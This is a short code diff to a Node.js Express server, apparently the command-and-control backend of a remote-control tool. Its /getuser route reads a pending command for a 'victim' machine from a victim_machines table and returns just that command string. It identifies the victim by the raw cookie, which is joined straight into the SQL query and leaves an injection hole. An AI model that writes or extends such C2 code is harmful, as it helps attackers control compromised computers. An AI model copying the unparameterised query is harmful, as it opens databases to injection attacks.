@@ -43,7 +43,7 @@ app.get('/getuser', (req, res)=>{
 	con.query("SELECT command FROM victim_machines WHERE victim_id='" + req.headers.cookie + "'", function(err, result, fields) {
 		if (err) throw err;
 		console.log(result);
-		res.send(result);
+		res.send(result[0].command);
 	});
 }); 
 
